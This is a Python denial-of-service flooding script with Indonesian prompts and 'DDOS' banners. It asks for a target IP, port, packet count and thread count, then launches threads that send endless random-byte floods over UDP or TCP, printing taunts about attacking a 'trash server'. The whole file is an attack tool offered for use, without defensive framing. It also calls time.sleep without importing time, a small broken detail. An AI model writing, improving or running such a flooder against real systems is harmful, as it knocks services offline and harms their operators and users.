import random
import socket
import threading
import os,sys
os.system("clear")

print("""
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░""")
time.sleep(2)
print("""\033[91m
███████╗██╗░░░██╗███╗░░██╗███╗░░██╗
██╔════╝╚██╗░██╔╝████╗░██║████╗░██║
█████╗░░░╚████╔╝░██╔██╗██║██╔██╗██║
██╔══╝░░░░╚██╔╝░░██║╚████║██║╚████║
██║░░░░░░░░██║░░░██║░╚███║██║░╚███║
╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚══╝╚═╝░░╚══╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░""")
ip = str(input("IP TARGET : "))
port = int(input("PORT TARGET : "))
choice = str(input("GASKEN DEK? : "))
times = int(input("PACKETNYA : "))
threads = int(input("THREADSNYA : "))

def run():
	data = random._urandom(2017)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("FYNN MENYERANG SERVER SAMPAH")
		except:
			print("DAMN, SERVER TIME OUT")

def run2():
	data = random._urandom(20017)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("FYNN MENYERANG SERVER SAMPAH")
		except:
			s.close()
			print("DAMN, SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
